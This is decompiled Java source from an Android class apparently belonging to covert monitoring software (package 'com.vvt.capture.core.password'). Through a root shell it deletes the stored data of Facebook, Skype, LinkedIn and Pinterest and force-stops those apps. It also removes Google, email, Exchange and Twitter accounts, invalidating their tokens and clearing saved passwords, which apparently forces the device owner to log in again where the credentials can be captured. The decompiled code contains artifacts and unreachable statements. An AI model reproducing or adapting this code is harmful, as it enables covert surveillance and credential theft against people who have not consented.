package com.vvt.capture.core.password;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import com.vvt.capture.e.b.b.d;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Iterator;

public class a
{
  private static boolean a = com.vvt.ak.a.a;
  private static boolean b = com.vvt.ak.a.e;
  
  private static String a(String paramString)
  {
    int i = 2;
    int j = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data";
    localObject2[j] = paramString;
    String str1 = String.format("%s/%s/shared_prefs", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    int k = 3;
    localObject2 = new Object[k];
    localObject2[0] = "/dbdata/databases";
    localObject2[j] = paramString;
    String str2 = "shared_prefs";
    localObject2[i] = str2;
    str1 = String.format("%s/%s/%s", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    boolean bool2 = false;
    str1 = null;
    localObject2 = ((ArrayList)localObject1).iterator();
    boolean bool3;
    do
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (String)((Iterator)localObject2).next();
      bool3 = ShellUtil.b((String)localObject1);
    } while (!bool3);
    for (;;)
    {
      if (localObject1 != null)
      {
        bool2 = a;
        if (!bool2) {}
      }
      bool2 = a;
      if (bool2) {}
      return (String)localObject1;
      bool1 = false;
      localObject1 = null;
    }
  }
  
  private static String a(String paramString1, String paramString2)
  {
    int i = 3;
    int j = 2;
    int k = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data";
    localObject2[k] = paramString1;
    localObject2[j] = paramString2;
    String str1 = String.format("%s/%s/databases/%s", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    localObject2 = new Object[i];
    String str2 = "/dbdata/databases";
    localObject2[0] = str2;
    localObject2[k] = paramString1;
    localObject2[j] = paramString2;
    str1 = String.format("%s/%s/%s", (Object[])localObject2);
    ((ArrayList)localObject1).add(str1);
    boolean bool2 = false;
    str1 = null;
    localObject2 = ((ArrayList)localObject1).iterator();
    boolean bool3;
    do
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (String)((Iterator)localObject2).next();
      bool3 = ShellUtil.b((String)localObject1);
    } while (!bool3);
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return (String)localObject1;
      bool1 = false;
      localObject1 = null;
    }
  }
  
  private static void a()
  {
    bool1 = a;
    if (bool1) {}
    String str1 = "com.pinterest";
    for (;;)
    {
      try
      {
        str1 = a(str1);
        boolean bool2 = com.vvt.ag.b.a(str1);
        if (bool2) {
          continue;
        }
        String str2 = "pinterest.xml";
        str1 = p.a(str1, str2);
        bool2 = a;
        if (bool2) {}
        str2 = "rm %s";
        int i = 1;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        str1 = String.format(str2, arrayOfObject);
        KMShell.a(str1);
        bool1 = a;
        if (bool1) {}
        str1 = "com.pinterest";
        ShellUtil.d(str1);
      }
      finally
      {
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private static void a(Context paramContext)
  {
    boolean bool = a;
    if (bool) {}
    String str = "com.twitter.android.auth.login";
    a(paramContext, str);
    bool = a;
    if (bool) {}
  }
  
  private static void a(Context paramContext, String paramString)
  {
    Object localObject1 = "account";
    try
    {
      localObject1 = paramContext.getSystemService((String)localObject1);
      localObject1 = (AccountManager)localObject1;
      Account[] arrayOfAccount = ((AccountManager)localObject1).getAccountsByType(paramString);
      int i = arrayOfAccount.length;
      int j = 0;
      while (j < i)
      {
        Object localObject2 = arrayOfAccount[j];
        ((AccountManager)localObject1).removeAccount((Account)localObject2, null, null);
        localObject2 = null;
        ((AccountManager)localObject1).invalidateAuthToken(paramString, null);
        localObject2 = "authtoken";
        ((AccountManager)localObject1).invalidateAuthToken(paramString, (String)localObject2);
        localObject2 = "password";
        ((AccountManager)localObject1).invalidateAuthToken(paramString, (String)localObject2);
        localObject2 = "userdata";
        ((AccountManager)localObject1).invalidateAuthToken(paramString, (String)localObject2);
        localObject2 = "";
        ((AccountManager)localObject1).invalidateAuthToken(paramString, (String)localObject2);
        localObject2 = arrayOfAccount[j];
        ((AccountManager)localObject1).clearPassword((Account)localObject2);
        j += 1;
      }
      boolean bool;
      return;
    }
    catch (Exception localException)
    {
      bool = b;
      if (!bool) {}
    }
  }
  
  public static void a(String paramString1, String paramString2, Context paramContext, String paramString3)
  {
    int i = a;
    if (i != 0) {}
    Application[] arrayOfApplication = Application.values();
    int k = arrayOfApplication.length;
    i = 0;
    if (i < k)
    {
      Application localApplication = arrayOfApplication[i];
      int[] arrayOfInt = b.a;
      int m = localApplication.ordinal();
      m = arrayOfInt[m];
      switch (m)
      {
      default: 
        boolean bool2 = a;
        if (!bool2) {
          break;
        }
      }
      for (;;)
      {
        int j;
        i += 1;
        break;
        c();
        continue;
        a(paramString1, paramString2, paramString3);
        continue;
        b();
        continue;
        a();
        continue;
        a(paramContext);
        continue;
        b(paramContext);
      }
    }
    boolean bool1 = a;
    if (bool1) {}
  }
  
  private static void a(String paramString1, String paramString2, String paramString3)
  {
    bool1 = a;
    if (bool1) {}
    String str1 = d.a(paramString1, paramString2, paramString3);
    String str2;
    if (str1 != null) {
      str2 = "config.xml";
    }
    try
    {
      str1 = p.a(str1, str2);
      boolean bool2 = ShellUtil.b(str1);
      boolean bool3 = a;
      if ((!bool3) || (bool2))
      {
        bool2 = a;
        if (bool2) {}
        str2 = "rm -r %s";
        bool3 = true;
        Object[] arrayOfObject = new Object[bool3];
        arrayOfObject[0] = str1;
        str1 = String.format(str2, arrayOfObject);
        KMShell.a(str1);
        str1 = "com.skype.raider";
        ShellUtil.d(str1);
      }
    }
    finally
    {
      for (;;)
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  private static void b()
  {
    bool1 = a;
    if (bool1) {}
    String str1 = "com.linkedin.android";
    for (;;)
    {
      try
      {
        str1 = a(str1);
        boolean bool2 = com.vvt.ag.b.a(str1);
        if (bool2) {
          continue;
        }
        bool2 = a;
        if (bool2) {}
        String str2 = "rm -r %s";
        int i = 1;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        str1 = String.format(str2, arrayOfObject);
        KMShell.a(str1);
        bool1 = a;
        if (bool1) {}
        str1 = "com.linkedin.android";
        ShellUtil.d(str1);
      }
      finally
      {
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private static void b(Context paramContext)
  {
    boolean bool = a;
    if (bool) {}
    a(paramContext, "com.google");
    a(paramContext, "com.android.email");
    a(paramContext, "com.google.android.legacyimap");
    a(paramContext, "com.google.android.email");
    a(paramContext, "com.android.exchange");
    String str = "com.google.android.exchange";
    a(paramContext, str);
    bool = a;
    if (bool) {}
  }
  
  private static void b(String paramString)
  {
    String str = "rm %s";
    boolean bool1 = true;
    try
    {
      Object[] arrayOfObject = new Object[bool1];
      arrayOfObject[0] = paramString;
      str = String.format(str, arrayOfObject);
      bool1 = a;
      if (bool1) {}
      KMShell.a(str);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
  }
  
  private static void c()
  {
    String str1 = "prefs_db";
    String str2 = a("com.facebook.katana", str1);
    boolean bool = com.vvt.ag.b.a(str2);
    if (!bool) {
      b(str2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/core/password/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */